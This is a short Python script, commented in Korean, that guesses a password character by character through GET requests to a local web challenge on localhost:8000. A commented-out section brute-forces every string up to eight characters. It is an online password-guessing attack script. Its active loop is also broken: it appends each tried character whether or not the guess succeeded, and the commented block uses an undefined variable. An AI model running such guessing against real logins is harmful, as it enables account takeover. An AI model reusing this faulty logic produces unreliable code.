import itertools
import string
import requests

#chars  = string.ascii_letters + string.digits  # 알파벳 대소문자와 숫자
chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'

# 비밀번호 추측
passwd = ''
for i in range(8):  # 비밀번호 길이를 8로 가정
    for char in chars:
        url = f"http://localhost:8000/?pw={passwd + char}"
        r = requests.get(url)

        if '흠 틀렸다고 할 수 있지' not in r.text:
            passwd += char
            print(f"현재 비밀번호: {passwd}")
            break
        passwd += char
        print(f"현재 비밀번호: {passwd}")

print("비밀번호 찾음: " + passwd)

# for length in range(1,9):
#     passwords = (''.join(candidate) for candidate in itertools.product(charset, repeat=length))

#     for password in passwords:
#         url = f"http://localhost:8000/?pw={password}"
#         response = requests.get(url)
#         print(url)

#     if '흠 틀렸다고 할 수 있지' not in response.text and "비밀번호를 입력하여 재우 프레스를 작동해보아요!" not in response.text :
#         print(f'비밀번호 찾음: {password}')
#         break



# url = f"http://localhost:8000/?pw=ㄴㅇㅁㄴㅇ"
# response = requests.get(url)

# print(response.text)

# if "흠" in response.text :
#     print("기모띠")
